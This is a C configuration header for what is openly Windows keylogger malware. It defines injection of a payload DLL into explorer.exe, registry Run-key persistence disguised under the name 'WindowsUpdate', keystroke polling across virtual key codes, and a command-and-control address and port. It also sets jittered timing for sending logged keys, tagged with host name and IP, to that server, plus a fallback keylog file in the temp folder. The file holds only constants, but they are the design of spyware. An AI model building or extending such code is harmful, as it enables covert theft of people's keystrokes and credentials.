#pragma once

// Target process name for injection
#define TARGET_PROCESS "explorer.exe"

// Payload DLL name
#define PAYLOAD_DLL_NAME "payload.dll"

// Log file name (will be placed in user's temp directory)
// The actual path is constructed dynamically using GetTempPathA()
#define LOG_FILE_NAME "syslog.txt"

// Registry persistence configuration
#define REGISTRY_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REGISTRY_VALUE_NAME "WindowsUpdate"

// Keylogger polling configuration
#define POLLING_INTERVAL_MS 10

// Virtual Key code range to monitor
#define VK_MIN 0x08  // Backspace
#define VK_MAX 0xDF  // Extended keys

// --- Network configuration ---

// C2 server defaults (overridden by config.ini)
#define C2_DEFAULT_IP       "127.0.0.1"
#define C2_DEFAULT_PORT     5555
#define CONFIG_FILE_NAME    "config.ini"

// Send buffer limits (server recv buffer = 4096)
#define SEND_BUFFER_MAX     4095

// Flush timing
#define FLUSH_BASE_INTERVAL_MS  60000   // 60 second base interval
#define FLUSH_JITTER_RATIO      0.3     // +/-30% jitter

// Ring buffer
#define RING_BUFFER_CAPACITY    2048

// Approximate formatted message size for flush threshold calculation
// "YYYY-MM-DD HH:MM:SS|xxx.xxx.xxx.xxx|HOSTNAME|VK=0xXX\n" ~ 60 bytes
#define APPROX_MSG_SIZE         60
#define FLUSH_COUNT_THRESHOLD   (SEND_BUFFER_MAX / APPROX_MSG_SIZE)

// TCP Keepalive
#define KEEPALIVE_IDLE_MS       30000   // 30s idle before first probe
#define KEEPALIVE_INTERVAL_MS   5000    // 5s between probes

// Fallback file (placed in %TEMP%)
#define FALLBACK_FILE_NAME  "keylog_fallback.txt"
